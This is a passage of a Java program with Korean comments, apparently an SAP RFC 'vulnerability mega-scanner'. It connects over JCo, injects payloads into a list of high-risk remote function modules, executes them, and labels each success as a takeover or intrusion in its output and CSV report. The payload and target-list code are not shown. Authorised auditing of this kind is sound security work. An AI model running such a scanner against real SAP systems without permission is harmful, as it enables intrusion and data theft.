import com.sap.conn.jco.*;
import java.util.*;
import java.io.*;

public class SapSecurityFinalAudit {
    private static final String DEST_NAME = "SAP_FULL_AUDIT_DEST";

    public static void main(String[] args) {
        Properties props = new Properties();
        // [필독] 현장 SAP 서버 정보로 수정하세요.
        props.setProperty("jco.client.ashost", "SAP_IP");
        props.setProperty("jco.client.sysnr",  "00");
        props.setProperty("jco.client.client", "100");
        props.setProperty("jco.client.user",   "USER_ID");
        props.setProperty("jco.client.passwd", "PASSWORD");
        props.setProperty("jco.client.lang",   "KO");

        try {
            createDestinationFile(DEST_NAME, props);
            JCoDestination dest = JCoDestinationManager.getDestination(DEST_NAME);
            JCoRepository repo = dest.getRepository();

            System.out.println("==================================================================");
            System.out.println("   [SAP RFC HIGH-RISK VULNERABILITY MEGA-SCANNER VER 3.0]");
            System.out.println("==================================================================");
            System.out.println(" Target User : " + props.getProperty("jco.client.user"));
            System.out.println(" Start Time  : " + new java.util.Date());
            System.out.println("==================================================================\n");

            // 130+ 고위험 RFC 타겟 리스트 생성
            List<String> targets = generateMegaTargetList();
            
            List<String[]> reportRows = new ArrayList<>();
            reportRows.add(new String[]{"RFC_NAME", "METADATA", "EXECUTION_STATUS", "RISK_LEVEL", "EVIDENCE"});

            int successCount = 0;
            for (String rfc : targets) {
                String[] result = conductDeepAudit(dest, repo, rfc);
                reportRows.add(result);
                if (result[2].contains("SUCCESS")) successCount++;
            }

            printFinalSummary(targets.size(), successCount);
            writeCsv("sap_rfc_mega_audit_report.csv", reportRows);

        } catch (Exception e) {
            System.err.println("[!] 시스템 치명적 오류: " + e.getMessage());
        }
    }

    private static String[] conductDeepAudit(JCoDestination dest, JCoRepository repo, String rfcName) {
        String metadata = "NOT_FOUND";
        String execution = "BLOCKED";
        String level = "SAFE";
        String evidence = "-";

        try {
            JCoFunction func = repo.getFunction(rfcName);
            if (func != null) {
                metadata = "EXPOSED(위험)";
                level = "LOW(설계도유출)";
                
                try {
                    injectPayload(func, rfcName);
                    func.execute(dest);
                    
                    // [핵심] 실행 성공 시 터미널에 대대적으로 출력
                    execution = "★★★ SUCCESS(탈취성공) ★★★";
                    level = "CRITICAL(즉시침투)";
                    evidence = collectEvidence(func, rfcName);
                    
                    System.out.println("------------------------------------------------------------------");
                    System.out.println("  [!!! 위험 !!!] " + rfcName);
                    System.out.println("  상태 : " + execution);
                    System.out.println("  증거 : " + evidence);
                    System.out.println("------------------------------------------------------------------");
                } catch (JCoException e) {
                    execution = analyzeError(e);
                    if (execution.contains("POTENTIAL")) {
                        level = "MEDIUM(권한열림)";
                        System.out.println("[?] " + String.format("%-30s", rfcName) + " : " + execution);
                    } else {
                        System.out.println("[ ] " + String.format("%-30s", rfcName) + " : " + execution);
                    }
                }
            }
        } catch (Exception e) { /* 조회 권한 자체 없음 */ }

        return new String[]{rfcName, metadata, execution, level, evidence};
    }

